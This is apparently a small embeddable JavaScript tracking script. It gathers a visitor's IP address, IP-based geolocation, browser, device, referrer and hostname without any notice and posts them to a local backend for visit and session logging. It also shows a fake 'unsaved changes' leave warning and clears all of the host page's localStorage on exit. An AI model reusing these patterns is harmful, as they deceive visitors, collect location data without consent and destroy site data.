
(async function() {
    try {
        
        // Fetch the user's public IP address
        const response = await fetch('https://api64.ipify.org?format=json');
        const { ip } = await response.json();

        const response2 = await fetch(`http://ip-api.com/json/${ip}`);
        const locationData = await response2.json();
    
        // Initial user details
        const userData = {
            ip: ip,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
        };

        // Detect device type based on userAgent
        let deviceType = "Unknown";
        if (/Mobi|Android/i.test(userData.userAgent)) {
            deviceType = "Mobile";
        } else if (/Tablet|iPad/i.test(userData.userAgent)) {
            deviceType = "Tablet";
        } else if (/Mac|Windows|Linux/i.test(userData.userAgent)) {
            deviceType = "Desktop";
        } else {
            deviceType = "Laptop";
        }

        // Detect browser type
        let browser = "Unknown";
        if (userData.userAgent.includes("Firefox")) {
            browser = "Firefox";
        } else if (userData.userAgent.includes("Chrome") && !userData.userAgent.includes("Edg")) {
            browser = "Chrome";
        } else if (userData.userAgent.includes("Safari") && !userData.userAgent.includes("Chrome")) {
            browser = "Safari";
        } else if (userData.userAgent.includes("Edg")) {
            browser = "Edge";
        }

        // Capture referrer for tracking sources
        const referrer = document.referrer || "Direct";

        // Combine all details into a single data object
        const finalData = {
            ip: userData.ip,
            deviceType,
            browser,
            referrer,
            timestamp: userData.timestamp,
            userAgent: userData.userAgent,
            language: userData.language,
            platform: userData.platform,
            address : locationData,
            url : window.location.hostname
        };

        // Log the final data to verify
        console.log(finalData);

        
        let data = await fetch('http://192.168.1.102:4000/traffic/visit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(finalData)
        });





        // user-session management !


        const sessionStart = new Date().getTime()
        console.log('Session started at:', sessionStart);

        function generateRandomCode(length = 30) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
        
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters[randomIndex];
            }
        
            return result;
        }

        const userId = generateRandomCode()

        // Send session start to the backend
        let sessionData = await fetch('http://192.168.1.102:4000/traffic/session/start', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ start: sessionStart , url: window.location.hostname , ip: userData.ip , id:userId }),
        });
        sessionData = await sessionData.json()

        localStorage.setItem('trafficUserId' , userId)

        console.log("response from server ,",sessionData)

        

        const handleUnload = async () => {
            const sessionEnd = new Date().getTime()
            console.log('Session ended at:', sessionEnd);

            // Send session end to the backend
            await fetch('http://192.168.1.102:4000/traffic/session/end', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ end: sessionEnd , id:localStorage.getItem('trafficUserId') , url: window.location.hostname }),
            });

            localStorage.clear()
        };

        window.addEventListener('beforeunload', async (event)=>{
            handleUnload();
            const message = "You have unsaved changes. Are you sure you want to leave?";
            event.returnValue = message; // This triggers the warning dialog
            return message;
        });


    } catch (error) {
        console.error('Tracking script error:', error);
    }
})();
